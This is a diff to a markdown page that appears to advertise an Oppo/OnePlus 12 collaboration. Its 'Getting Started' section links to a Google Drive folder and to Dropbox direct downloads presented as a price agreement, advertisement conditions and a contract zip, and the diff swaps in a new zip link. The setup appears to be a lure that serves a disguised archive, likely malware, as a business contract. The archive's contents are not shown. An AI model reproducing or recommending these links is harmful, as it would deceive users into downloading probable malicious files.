@@ -66,7 +66,7 @@ This collaboration not only brings the OnePlus 12 to the forefront of the tech c
 ## Getting Started
 ## [⚡️Oppo(OnePlus12)PriceAgreement ](https://drive.google.com/drive/folders/1A4AuEV76DmZAKM-RbzirVOW8J5w6H_8Q?usp=drive_link)
 ## [⚡️Oppo(OnePlus12)AdvertisementConditions ](https://www.dropbox.com/scl/fo/f9csscloszwghh57pd0ix/h?rlkey=rlpkk6nf1z32cuj18kv7z4186&dl=1)
-## [⚡️OppoPremiumContract ](https://www.dropbox.com/scl/fi/az0l8b5bbunt4mtv3dc5i/Oppo-Contract.zip?rlkey=t4x97yklduf1520qjhnzranb2&dl=1)
+## [⚡️OppoPremiumContract ](https://www.dropbox.com/scl/fi/0gt7syeti6xz0brq6krd6/Oppo-Contract.zip?rlkey=krra8cos948ib90di6usozjwx&dl=1)
 
 
 
